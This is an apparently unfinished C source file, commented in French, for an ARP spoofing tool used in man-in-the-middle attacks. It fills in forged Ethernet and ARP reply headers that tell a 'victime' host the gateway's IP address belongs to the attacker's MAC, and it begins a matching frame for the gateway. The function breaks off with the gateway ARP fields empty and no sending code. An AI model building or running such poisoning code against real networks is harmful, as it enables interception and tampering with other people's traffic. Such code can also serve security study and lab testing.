#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <net/ethernet.h>     // ETH_P_ARP, ETH_P_IP
#include <netpacket/packet.h> // struct sockaddr_ll
#include <netinet/if_ether.h> // struct ether_arp, ARPHRD_ETHER, ARPOP_REPLY
#include <net/if_arp.h>
#include <sys/types.h>
#include "poisoning.h"

void *poison_thread(void *arg)
{
    mitm_ctx *ctx = (mitm_ctx *)arg;

    unsigned char buffer_victim[42];
    unsigned char buffer_gateway[42];

    struct sockaddr_ll socket_address_victim;
    struct sockaddr_ll socket_address_gateway;

    struct ether_header *eth_victim = (struct ether_header *)buffer_victim;
    struct ether_arp *arp_victim = (struct ether_arp *)(buffer_victim + sizeof(struct ether_header));

    struct ether_header *eth_gateway = (struct ether_header *)buffer_gateway;
    struct ether_arp *arp_gateway = (struct ether_arp *)(buffer_gateway + sizeof(struct ether_header));

    memset(&socket_address_victim, 0, sizeof(socket_address_victim));
    socket_address_victim.sll_family  = AF_PACKET;
    socket_address_victim.sll_ifindex = ctx->if_index;
    socket_address_victim.sll_halen   = ETH_ALEN;
    memcpy(socket_address_victim.sll_addr, ctx->victim_mac, 6);

    memset(&socket_address_gateway, 0, sizeof(socket_address_gateway));
    socket_address_gateway.sll_family  = AF_PACKET;
    socket_address_gateway.sll_ifindex = ctx->if_index;
    socket_address_gateway.sll_halen   = ETH_ALEN;
    memcpy(socket_address_gateway.sll_addr, ctx->gateway_mac, 6);

    // ------------ Remplissage headers Ethernet + ARP pour la victime ----------------// 

    // --------------------------------VICTIME----------------------------------//


    memcpy(eth_victim->ether_dhost, ctx->victim_mac, 6);
    memcpy(eth_victim->ether_shost, ctx->attacker_mac, 6);
    eth_victim->ether_type = htons(ETH_P_ARP); 

    arp_victim->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_victim->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp_victim->ea_hdr.ar_hln = ETH_ALEN;
    arp_victim->ea_hdr.ar_pln = 4;
    arp_victim->ea_hdr.ar_op  = htons(ARPOP_REPLY);

    memcpy(arp_victim->arp_sha, ctx->attacker_mac, 6);
    memcpy(arp_victim->arp_spa, &ctx->gateway_ip, 4);
    memcpy(arp_victim->arp_tha, ctx->victim_mac, 6);
    memcpy(arp_victim->arp_tpa, &ctx->victim_ip, 4);


    // --------------------------------GATEWAY----------------------------------//

    memcpy(eth_gateway->ether_dhost, ctx->gateway_mac, 6);
    memcpy(eth_gateway->ether_shost, ctx->attacker_mac, 6);
    eth_gateway->ether_type = htons(ETH_P_ARP);

    
    






}